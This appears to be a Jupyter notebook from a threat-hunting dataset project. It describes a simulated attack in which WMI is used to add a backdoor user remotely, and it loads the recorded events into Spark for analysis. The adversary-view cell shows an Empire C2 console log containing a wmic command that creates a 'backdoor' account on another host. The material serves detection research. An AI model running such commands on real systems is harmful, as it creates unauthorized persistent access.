{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# WMIC Add User Backdoor"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                       |    |\n",
    "|:----------------------|:---|\n",
    "| id                    | SDWIN-190518231333 |\n",
    "| author                | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date         | 2019/05/18 |\n",
    "| platform              | Windows |\n",
    "| Tactic(s)             | ['[TA0002](https://attack.mitre.org/tactics/TA0002)', '[TA0008](https://attack.mitre.org/tactics/TA0008)'] |\n",
    "| Technique(s)          | ['[T1047](https://attack.mitre.org/techniques/T1047)'] |\n",
    "| Simulaton Environment | Mordor shire |\n",
    "| Simulation Scripts    | [None] |\n",
    "| Dataset Host           | ['https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/host/empire_wmic_add_user_backdoor.zip'] |\n",
    "| References        | None |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries using WMI to add a backdoor user on endpoints remotely"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: agents) > \n",
    "[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n",
    "[*] New agent 6Z78CY25 checked in\n",
    "[+] Initial agent 6Z78CY25 from 172.18.39.5 now active (Slack)\n",
    "[*] Sending agent (stage 2) to 6Z78CY25 at 172.18.39.5\n",
    "agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "KFL6CMNZ ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         7584   5/0.0    2020-09-14 11:33:59  http            \n",
    "YGBLW8EM ps 172.18.39.5     WORKSTATION5      *THESHIRE\\wardog        powershell         8924   5/0.0    2020-09-14 11:40:53  http            \n",
    "UBCKLYFA ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5412   5/0.0    2020-09-14 11:57:16  http            \n",
    "\n",
    "6Z78CY25 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         9564   5/0.0    2020-09-14 12:02:08  http            \n",
    "\n",
    "(Empire: agents) > interact 6Z78CY25\n",
    "(Empire: 6Z78CY25) > \n",
    "(Empire: 6Z78CY25) > shell wmic /node:WORKSTATION6 process call create \"net user /add backdoor pa$$w0rd1\"\n",
    "[*] Tasked 6Z78CY25 to run TASK_SHELL\n",
    "[*] Agent 6Z78CY25 tasked with task ID 1\n",
    "(Empire: 6Z78CY25) > \n",
    "Executing (Win32_Process)->Create()\n",
    "\n",
    "Method execution successful.\n",
    "\n",
    "Out Parameters:\n",
    "instance of __PARAMETERS\n",
    "{\n",
    "  ProcessId = 7768;\n",
    "  ReturnValue = 0;\n",
    "};\n",
    "\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: 6Z78CY25) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/host/empire_wmic_add_user_backdoor.zip\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT *\n",
    "FROM mordorTable\n",
    "    '''\n",
    ")\n",
    "df.printSchema()\n",
    "        "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "PySpark_Python3",
   "language": "python",
   "name": "pyspark3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
